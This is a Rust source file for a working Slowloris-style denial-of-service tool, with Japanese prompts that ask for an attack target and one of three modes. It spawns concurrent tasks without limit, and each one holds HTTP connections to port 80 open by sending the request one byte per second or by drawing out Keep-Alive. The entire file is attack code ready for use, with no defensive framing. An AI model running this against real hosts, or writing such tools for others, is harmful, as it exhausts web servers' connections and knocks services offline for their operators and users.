#[macro_use]
extern crate lazy_static;
extern crate tokio;

use std::{io::Write, time::Duration};

use tokio::{
    io::{AsyncReadExt, AsyncWrite, AsyncWriteExt, BufStream},
    sync::RwLock,
    time::sleep,
};

struct Session {
    http_request: Vec<u8>,
    connect: String,
    mode: u8,
    errors: RwLock<u8>,
}

impl Session {
    fn new() -> Session {
        Session {
            http_request: b"GET / HTTP/1.1\r\nConnection: keep-alive\r\n".to_vec(),
            connect: String::new(),
            mode: 0,
            errors: RwLock::const_new(0),
        }
    }
}

lazy_static! {
    static ref SESSION: RwLock<Session> = RwLock::const_new(Session::new());
}

#[tokio::main]
async fn main() {
    let mut session = SESSION.write().await;

    println!("モードを選んでください");
    println!("1: 低速リクエスト\n2: Keep-Aliveを長引かせる\n3: 1と2の合わせ技");
    print!("> ");
    std::io::stdout().flush().unwrap();
    let mut mode = String::new();
    std::io::stdin().read_line(&mut mode).unwrap();
    let mode: u8 = mode.trim().parse().unwrap();
    if 3 < mode {
        panic!("変な値が入力されたようです");
    } else {
        session.mode = mode;
    }

    println!("攻撃先を指定してください");
    print!("> ");
    std::io::stdout().flush().unwrap();
    let mut connect = String::new();
    std::io::stdin().read_line(&mut connect).unwrap();
    let mut connect = connect.trim().to_string();
    session.http_request.extend(b"Host: ");
    session.http_request.extend(connect.as_bytes());
    session.http_request.extend(b"\r\n\r\n");
    connect.push_str(":80");
    session.connect = connect;
    drop(session);

    let session = SESSION.read().await;
    loop {
        let errors = session.errors.read().await;
        if *errors == u8::MAX {
            break;
        }
        drop(errors);

        tokio::spawn(attack());
    }
    loop {
        sleep(Duration::from_secs(1)).await;
        tokio::spawn(attack());
    }
}

async fn attack() {
    let session = SESSION.read().await;
    loop {
        let connect = match tokio::net::TcpStream::connect(&session.connect).await {
            Ok(o) => BufStream::new(o),
            Err(_) => {
                let mut errors = session.errors.write().await;
                if *errors < u8::MAX {
                    *errors += 1;
                }
                return;
            }
        };
        let (mut read, mut write) = tokio::io::split(connect);

        let receive = tokio::spawn(async move {
            let mut buffer = [0_u8];
            loop {
                if read.read_exact(&mut buffer).await.is_err() {
                    break;
                }
            }
        });

        match session.mode {
            1 => {
                mode1(&mut write).await;
            }
            2 => {
                mode2(&mut write).await;
                loop {
                    if !mode1(&mut write).await {
                        break;
                    }
                }
            }
            3 => loop {
                if !mode1(&mut write).await {
                    break;
                }
            },
            _ => (),
        }

        receive.abort();
    }
}

async fn mode1<T: AsyncWrite + std::marker::Unpin>(write: &mut T) -> bool {
    let session = SESSION.read().await;
    for i in 0..session.http_request.len() {
        let _ = write.write_all(&session.http_request[i..i + 1]).await;
        if write.flush().await.is_err() {
            return false;
        };
        sleep(Duration::from_secs(1)).await;
    }
    true
}
async fn mode2<T: AsyncWrite + std::marker::Unpin>(write: &mut T) {
    let session = SESSION.read().await;
    let _ = write.write_all(&session.http_request).await;
}
